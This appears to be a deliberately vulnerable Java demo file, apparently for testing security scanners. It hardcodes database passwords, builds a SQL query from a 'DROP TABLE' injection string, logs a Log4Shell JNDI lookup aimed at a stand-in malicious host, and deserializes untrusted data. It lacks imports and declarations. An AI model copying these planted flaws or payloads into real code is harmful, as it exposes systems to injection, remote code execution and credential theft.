package org.example;

//TIP To <b>Run</b> code, press <shortcut actionId="Run"/> or
// click the <icon src="AllIcons.Actions.Execute"/> icon in the gutter.
public class Main {
    // public static void main(String[] args) {
    //     //TIP Press <shortcut actionId="ShowIntentionActions"/> with your caret at the highlighted text
    //     // to see how IntelliJ IDEA suggests fixing it.
    //     System.out.printf("Hello and welcome!");

    //      // Hardcoded credentials (Security issue)
    //     String username = "admin";
    //     String password = "password123";  // Hardcoded password

    //     // Vulnerable SQL query (SQL Injection)
    //     String userInput = "'; DROP TABLE users; --";
    //     String query = "SELECT * FROM users WHERE username = '" + userInput + "'"; // SQL Injection risk
        

    //     for (int i = 1; i <= 5; i++) {
    //         //TIP Press <shortcut actionId="Debug"/> to start debugging your code. We have set one <icon src="AllIcons.Debugger.Db_set_breakpoint"/> breakpoint
    //         // for you, but you can always add more by pressing <shortcut actionId="ToggleLineBreakpoint"/>.
    //         System.out.println("i = " + i);
    //         //do smthg spcl test
    //         //test123
    //     }
    // }
     public static void main(String[] args) {
        // 🚨 Hardcoded credentials (Security Issue)
        String dbUser = "admin";
        String dbPassword = "password123"; // Vulnerability: Hardcoded password

        // 🚨 Vulnerable SQL query (SQL Injection)
        String userInput = "'; DROP TABLE users; --"; // Attacker-controlled input
        String query = "SELECT * FROM users WHERE username = '" + userInput + "'"; // Vulnerable SQL injection

        System.out.println("Hello, running vulnerable app...");

        // Log4j vulnerability (Log4Shell exploit attempt)
        logger.error("${jndi:ldap://malicious-server.com/exploit}");

        try {
            // 🚨 Insecure Database Connection (Hardcoded Credentials)
            Connection conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/mydb", "root", "root123");
            Statement stmt = conn.createStatement();
            ResultSet rs = stmt.executeQuery(query);
            while (rs.next()) {
                System.out.println("User: " + rs.getString("username"));
            }
        } catch (Exception e) {
            e.printStackTrace();
            //test ex
        }

        // 🚨 Insecure deserialization (RCE vulnerability)
        try {
            String serializedData = "rO0ABXNyAC5qYXZhLnV0aWwuQXJyYXlMaXN0x...";
            byte[] data = Base64.getDecoder().decode(serializedData);
            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
            Object obj = ois.readObject(); // 🚨 Unsafe deserialization
            ois.close();
            System.out.println("Deserialized: " + obj);
            //test
            //tester
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
